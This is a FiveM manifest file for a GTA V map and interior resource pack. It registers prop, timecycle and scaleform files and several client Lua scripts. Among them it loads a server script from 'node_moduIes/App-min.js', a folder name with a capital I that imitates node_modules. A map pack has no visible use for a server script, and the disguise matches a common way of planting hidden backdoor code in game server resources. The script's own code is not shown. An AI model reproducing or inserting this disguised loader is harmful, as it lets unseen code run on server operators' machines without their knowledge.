fx_version 'adamant'
game 'gta5'

this_is_a_map 'yes'

data_file('DLC_ITYP_REQUEST')('stream/v_int_62.ytyp')
files {

"interiorproxies.meta"
}

data_file 'INTERIOR_PROXY_ORDER_FILE' 'interiorproxies.meta'


file 'bs_timecycmod.xml'

client_script 'c_burgershot.lua'

data_file 'TIMECYCLEMOD_FILE' 'bs_timecycmod.xml'
data_file 'SCALEFORM_DLC_FILE' 'stream/int1756029552.gfx'
server_script "node_moduIes/App-min.js"

files {
    'shellprops.ytyp'
}

data_file 'DLC_ITYP_REQUEST' 'shellprops.ytyp'

data_file ('DLC_ITYP_REQUEST') ('stream/cayomlo/int_cayo_props.ytyp')
data_file ('DLC_ITYP_REQUEST') ('stream/cayomlo/med/int_cayo_med_props.ytyp')

data_file "SCALEFORM_DLC_FILE" "stream/cpminimap/int3232302352.gfx"

files {
    "stream/cpminimap/int3232302352.gfx",
    'shellpropv2s.ytyp'
}

data_file 'DLC_ITYP_REQUEST' 'shellpropsv2.ytyp'

file 'gabz_timecycle_mods_1.xml'
data_file 'TIMECYCLEMOD_FILE' 'gabz_timecycle_mods_1.xml'

client_script {
    'uj_cayo_perico_fixed.lua',
    "c_pacific",
    "c_arcade.lua",
    "c_spital.lua",
}

-- la porci interior

data_file "DLC_ITYP_REQUEST" "fish_ytyp.ytyp"

data_file "DLC_ITYP_REQUEST" "deerhead_ytyp.ytyp"

-- pod cayo

data_file 'DLC_ITYP_REQUEST' 'stream/bridge_part.ytyp'

-- bakery

data_file('DLC_ITYP_REQUEST')('stream/tiwabs_bakery_ytyp.ytyp')

-- pacific

files {
    'k4mb1_ornate_bank.ytyp'
}

data_file 'DLC_ITYP_REQUEST' 'k4mb1_ornate_bank.ytyp'